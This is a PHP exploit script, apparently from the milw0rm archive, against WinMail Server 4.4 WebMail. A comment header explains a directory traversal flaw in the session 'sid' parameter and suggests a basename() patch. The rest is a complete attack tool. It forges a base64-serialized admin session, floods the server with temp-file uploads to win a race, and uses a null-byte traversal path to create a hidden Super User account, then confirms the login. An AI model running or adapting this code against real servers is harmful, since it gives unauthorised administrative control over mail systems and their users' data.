<?php
/*  WinMail Server 4.4 build 1124 (WebMail) remote add new Super User exploit
 *  by rgod
 *
 *  software site: http://www.magicwinmail.net/download.asp
 *
 *
 *  vulnerable code in /inc/class.session.php at lines 8-25:
 *  ...
 *	 function Load() {
 *		$result      = Array();
 *
 *		$sessionfile = $this->temp_folder."_sessions/".$this->sid.".sess";
 *		if(!file_exists($sessionfile))
 *			return false;
 *
 *		$size = filesize($sessionfile);
 *
 *		$fp = fopen($sessionfile, "rb");
 *		if ($fp){
 *			$result = fread($fp, $size);
 *			fclose($fp);
 *		}
 *		$result = unserialize(base64_decode($result));
 *
 * 		return $result;
 *	}
 * ...
 *
 * This function should check for session files located	in /temp/_sessions
 * folder outside of the www path. But the "sid" argument is not checked
 * for directory traversal attacks. So you can supply a path to an arbitrary
 * file, ex: a temporary uploaded file with well crafted content.
 *
 * phpinfo() shows that the value for upload_tmp_dir is not set, so the folder
 * used to store this files becomes /windows/temp or /winnt/temp.
 *
 * also magic_quotes_gpc = off and open_basedir is not set, so...
 *
 * http://target:6080/admin/main.php?sid=../../../../../../windows/temp/phpFFFF.tmp%00
 *
 * set the magicwinmail_session_id cookie to the same value and you will have admin
 * access!
 *
 * This script uploads a large amount of temporary files to quickly reach
 * the ffff index and quickly call the main script before the temporary file is deleted
 * to set a new Super User account.
 *
 * Possible patch:
 *
 * ...
 * $sessionfile = $this->temp_folder."_sessions/".basename($this->sid).".sess";
 * ...
 *
*/

if ($argc<2) {
    print_r('
Usage: php '.$argv[0].' host OPTIONS
host:      target server (ip/hostname)
Options:
 -p[port]:    specify a port other than 6080
 -P[ip:port]: specify a proxy
Example:
php '.$argv[0].' localhost -P1.1.1.1:8080
php '.$argv[0].' localhost -p81
');
    die;
}
error_reporting(0);
ini_set("max_execution_time",0);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function send($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],(int)$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

function sendii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex, $ssock;
  if ($proxy=='') {
    $ssock=fsockopen(gethostbyname($host),$port);
    if (!$ssock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ssock=fsockopen($parts[0],$parts[1]);
    if (!$ssock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ssock,$packet);
}

$host=$argv[1];
$path=$argv[2];
$port=6080;
$proxy="";
for ($i=3; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if ($temp=="-p")
{
  $port=(int)str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}

$____suntzu=array();
$____suntzu["user"]="admin";
$____suntzu["pass"]="suntzu";
$____suntzu["usertype"]="0";
$____suntzu["adminrange"]="";
$____suntzu["auth"]="1";
$____suntzu["start"]="9999999999";
$____suntzu["initconfig"]["mailstore_directory"]="C:\\";
$____suntzu["initconfig"]["netstore_driectory"]="C:\\";
$____suntzu["initconfig"]["postmaster_address"]="postmaster@server.com";
$____suntzu["initconfig"]["congratulate_subject"]="welcome";
$____suntzu["initconfig"]["congratulate_content"]="hi";
$____suntzu["initconfig"]["ldap_base_dn"]="o=magicwinmail";
$____suntzu["initconfig"]["ldap_root_dn"]="o=magicwinmail";
$____suntzu["initconfig"]["ldap_root_pwd"]="9999999999";
$____suntzu["initconfig"]["allow_webadmin"]="1";
$____suntzu["initconfig"]["idle_timeout"]="1800";
$____suntzu["initconfig"]["enable_cookies"]="";
$____suntzu["initconfig"]["smtp_server"]="127.0.0.1";
$____suntzu["initconfig"]["smtp_port"]="25";
$____suntzu["initconfig"]["ldap_server"]="127.0.0.1";
$____suntzu["initconfig"]["ldap_port"]="309";
$____suntzu["initconfig"]["register_user_total"]="20";
$____suntzu["mainpage"]="1";
$____suntzu["accountstatus"]="2";
$____suntzu["expiretime"]="2592000";
$____suntzu["searchtype"]="";

$my_magic_string=serialize($____suntzu);
$my_magic_string=base64_encode($my_magic_string);

echo "magic string -> ".$my_magic_string."\n";

//fill with possible locations
$my_path=array("../../../../../../winnt/temp/",
               "../../../../../../windows/temp/",
	       "../../../../../winnt/temp/",
               "../../../../../windows/temp/");

$my_file="phpFFFF.tmp"; //change, if u want
$my_admin="akira";
$my_pass="akira";
$my_retries=9999;

echo "Please wait ...\n";

for ($j=0; $j<count($my_path); $j++){
    for ($i=0; $i<$my_retries; $i++){
        $data="";
        for ($k=1; $k<=999; $k++){
            $data.="-----------------------------7d6224c08dc\n".
            "Content-Disposition: form-data; name=\"suntzu[$i][$k]\"; filename=\"suntzoi$i$k\";\n\n".
            $my_magic_string."\n";
        }
        $data.="-----------------------------7d6224c08dc--\n";
        $packet="POST /admin/main.php HTTP/1.1\r\n". //a time consuming script
        "Host: ".$host."\r\n".
        "Accept: text/plain\r\n".
        "Content-Type: multipart/form-data; boundary=---------------------------7d6224c08dc\r\n".
        "Content-Length: ".strlen($data)."\r\n".
        "Connection: Keep-Alive\r\n\r\n".
        $data;
        sendii($packet);

        $sid=urlencode($my_path[$j].$my_file."\x00");

        $data="dest=adminuser".
        "&sub_action=added".
        "&sid=$sid".
        "&lid=0".
        "&tid=0".
        "&adminrange=".
        "&oldpassword=".
        "&username=".urlencode($my_admin).
        "&password=".urlencode($my_pass).
        "&confirmpwd=".urlencode($my_pass).
        "&description=suntzuuuuu".
        "&usertype=0H";
        $packet="POST /admin/main.php HTTP/1.1\r\n".
        "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n".
        "Referer: http://$host:$port/admin/main.php\r\n".
        "Accept-Language: it\r\n".
        "Content-Type: application/x-www-form-urlencoded\r\n".
        "Accept-Encoding: text/plain\r\n".
        "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\r\n".
        "Host: $host:$port\r\n".
        "Content-Length: ".strlen($data)."\r\n".
        "Connection: Close\r\n".
        "Cache-Control: no-cache".
        "Cookie: magicwinmail_session_id=$sid; magicwinmail_admin_default_theme=admindefault; magicwinmail_admin_default_language=en; magicwinmail_admin_default_domain=server.com; magicwinmail_default_theme=default; magicwinmail_default_language=en; magicwinmail_domain_name=server.com; magicwinmail_login_userid=postmaster\r\n\r\n".
        $data;
        send($packet);

        fclose($ssock);

        $data="f_user=".urlencode($my_admin).
        "&f_pass=".urlencode($my_pass).
        "&lng=0".
        "&sid=".
        "&tid=".
        "&dest=login";
        $packet="POST /admin/login.php HTTP/1.0\r\n".
        "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n".
        "Referer: http://$host:$port/admin/login.php\r\n".
        "Accept-Language: en\r\n".
        "Content-Type: application/x-www-form-urlencoded\r\n".
        "User-Agent: Lynx/2.8.3dev.8 libwww-FM/2.14FM\r\n".
        "Host: $host:$port\r\n".
        "Content-Length: ".strlen($data)."\r\n".
        "Pragma: no-cache\r\n".
        "Cookie: magicwinmail_admin_default_theme=admindefault; magicwinmail_admin_default_language=en; magicwinmail_admin_default_domain=server.com; magicwinmail_default_theme=default; magicwinmail_default_language=en; magicwinmail_domain_name=server.com; magicwinmail_login_userid=postmaster\r\n".
        "Connection: Close\r\n\r\n".
        $data;
        send($packet);
	if (!eregi("badlogin",$html)){die("Done! Login to the admin panel with username \"$my_admin\" and pass \"$my_pass\"\n");}
    }
}
//if you are here...
echo "exploit failed...";
?>

# milw0rm.com [2007-04-01]
